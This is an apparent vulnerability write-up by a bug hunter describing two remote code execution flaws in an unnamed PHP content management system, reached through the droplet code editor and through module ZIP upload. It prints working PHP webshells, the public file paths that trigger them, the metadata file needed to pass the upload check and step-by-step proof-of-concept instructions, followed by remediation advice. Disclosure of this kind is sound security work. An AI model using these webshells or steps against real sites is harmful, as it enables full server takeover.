
## Introduction

It was my birthday evening. Most people would be out celebrating — I decided to go bug hunting instead. No regrets whatsoever.

What started as a casual poke at a popular open-source PHP-based Content Management System quickly turned into something far more rewarding. By the end of the night, I had uncovered **two distinct Remote Code Execution vulnerabilities** — both requiring only admin-level access to trigger, and both leaving the server wide open to unauthenticated exploitation afterwards.

Here's what I found:

1. **Code Injection via the Oneliner Droplet** – An admin can inject arbitrary PHP code into the built-in Oneliner droplet editor, which writes it directly to a publicly accessible PHP file on disk with no sanitization.
2. **RCE via Malicious Archive Upload** – An admin can upload a crafted ZIP archive disguised as a plugin/module, which gets extracted into the webroot with zero content validation.

Let's get into it.

## Vulnerability 1: Code Injection via the Oneliner Droplet

### Background

The CMS ships with a **Droplets** feature — a system for creating reusable PHP code snippets that can be embedded anywhere on the site using simple tags (e.g. `[[OneLiner]]`). One of the built-in droplets is called **Oneliner**, designed to generate random one-liner text on a page.

Administrators can open and edit any droplet's code directly from the admin panel through a web-based PHP editor. On the surface, this is a legitimate power-user feature. The problem is in what happens when you hit **Save**.

### Root Cause

The save handler takes whatever code is submitted and writes it **verbatim** to a standalone PHP file on disk — no sanitization, no content filtering, no allowlist. The Oneliner droplet specifically gets saved to a fixed, predictable path inside the modules directory.

Here's the kicker: **that file is publicly accessible with no authentication required**.

The full attack chain:

1. Admin submits a PHP payload via a `save_droplet` POST request to the save handler
2. The application writes it directly to the Oneliner droplet's `.php` file on disk
3. That file is publicly reachable at a predictable URL — no auth required to visit it

### Proof of Concept

**Step 1:** Log into the admin panel.

**Step 2:** Navigate to the **Admin Tools** section.

**Step 3:** Open the **Droplets** management tool.

**Step 4:** Select **Oneliner** from the list of available droplets.

**Step 5:** Inject your PHP webshell into the **Code** field:

```php
<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}?>
```

**Step 6:** Hit **Save**.

**Step 7:** Navigate directly to the saved droplet file in your browser:

```
http://<target>/modules/droplets/example/Oneliner.php?cmd=id
```

You'll be greeted with something like:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![[Screenshot 2026-06-20 021731.png]]

Full remote code execution. No further authentication needed.

### Why This Works

The Oneliner droplet editor trusts that admins will only write safe, well-behaved PHP. No attempt is made to validate or restrict what gets saved. Since the resulting file lives at a publicly accessible path with no access controls sitting in front of it, once the payload is written, anyone on the internet can trigger it directly.


## Vulnerability 2: RCE via Malicious Archive Upload

### Background

The CMS supports extending its functionality through installable modules/plugins. Administrators can upload a ZIP archive from the admin panel, and the system extracts it directly into the webroot's modules directory.

The only check performed is verifying the presence of a metadata file inside the ZIP with a handful of required variable declarations. That's where the validation ends.

### Root Cause

Since the application performs **no content inspection** on the files inside the archive, any PHP file bundled alongside the metadata gets extracted into a web-accessible directory — and becomes immediately reachable by unauthenticated users via a direct HTTP request.

The internal logic looks roughly like this:

```php
$sAddonDirectory = 'shell'; // read from $module_directory in the metadata file
$sAddonAbsDir    = $sAppPath . 'modules/' . $sAddonDirectory;
// resolves to: /var/www/html/modules/shell

make_dir($sAddonAbsDir); // creates the directory

$oArchive->extract(PCLZIP_OPT_PATH, $sAddonAbsDir);
// extracts everything — including any PHP webshell — into the directory
```

Everything in the ZIP lands directly in the webroot. No further checks. The shell is live the moment installation completes.

### Building the Payload

You need two files:

**`shell.php`** — the webshell:

```php
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>
```

**`info.php`** — the required metadata file:

```php
<?php
$module_directory   = 'shell';
$module_name        = 'Shell';
$module_type        = 'addon';
$module_function    = 'page';
$module_version     = '1.0.0';
$module_platform    = '2.13.0';
$module_author      = 'admin';
$module_license     = 'GNU General Public License';
$module_description = 'Shell module';
```

Bundle them together:

```bash
zip module_install.zip shell.php info.php
```

> **Note:** Use a directory name that doesn't conflict with any existing module — the system will reject uploads that clash with existing names.

### Proof of Concept

**Step 1:** Log into the admin panel.

**Step 2:** Navigate to the **Add-ons** or **Extensions** section.

**Step 3:** Go to **Modules** and find the module installation form.

**Step 4:** Upload your crafted `module_install.zip`.

**Step 5:** Click **Install**.

**Step 6:** Visit the extracted webshell directly:

```
http://<target>/modules/shell/shell.php?cmd=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Impact

Both vulnerabilities sit behind admin authentication, but that's a thinner barrier than it sounds. In real-world scenarios, admin access can be reached through:

- Default or weak credentials left unchanged
- Credential stuffing or phishing attacks
- A separate privilege escalation bug chained with either of these

Once an attacker clears that hurdle, they have a direct path to **full server compromise** — and the resulting shell requires no authentication at all to operate.

## Remediation

**For the Oneliner Droplet:** The application should never write raw user-supplied PHP code to a web-accessible file. The droplet save handler needs content filtering at minimum, and the resulting file should never be directly reachable without an authentication gate in front of it.

**For the module upload:** Archive contents must be inspected before extraction. Only expected, explicitly allowed file types should be extracted, and PHP files should be categorically blocked. Ideally, uploaded module files should live outside the webroot entirely.

## Conclusion

Two vulnerabilities, one birthday evening. Both rooted in the same underlying mistake: **trusting that admin input is safe, and placing the output somewhere the whole internet can reach**.

Privilege doesn't equal safety. Your file handling pipeline needs hardening regardless of who's on the other end of the request.

Stay curious. 🎂

